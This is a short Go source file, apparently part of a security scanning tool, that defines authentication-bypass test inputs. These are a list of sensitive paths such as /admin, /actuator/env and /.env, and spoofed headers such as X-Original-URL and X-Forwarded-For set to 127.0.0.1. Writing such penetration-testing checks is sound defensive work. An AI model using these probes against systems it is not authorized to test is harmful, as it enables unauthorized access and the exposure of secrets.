package techniques

// AuthBypassPatterns for authentication bypass testing.
var AuthBypassPatterns = []string{
	"/admin",
	"/admin/",
	"/administrator",
	"/api/admin",
	"/dashboard",
	"/internal",
	"/debug",
	"/actuator",
	"/actuator/env",
	"/swagger-ui.html",
	"/api-docs",
	"/.env",
	"/config",
	"/backup",
	"/wp-admin",
	"/phpmyadmin",
}

// AuthBypassHeaders for header-based auth bypass.
var AuthBypassHeaders = map[string]string{
	"X-Original-URL":     "/admin",
	"X-Rewrite-URL":      "/admin",
	"X-Forwarded-For":    "127.0.0.1",
	"X-Remote-IP":        "127.0.0.1",
	"X-Custom-IP-Auth":   "127.0.0.1",
	"X-Real-IP":          "127.0.0.1",
}

// AuthBypassDescription describes the auth bypass technique.
const AuthBypassDescription = "Authentication Bypass - Tests for unauthorized access to protected endpoints and admin panels"
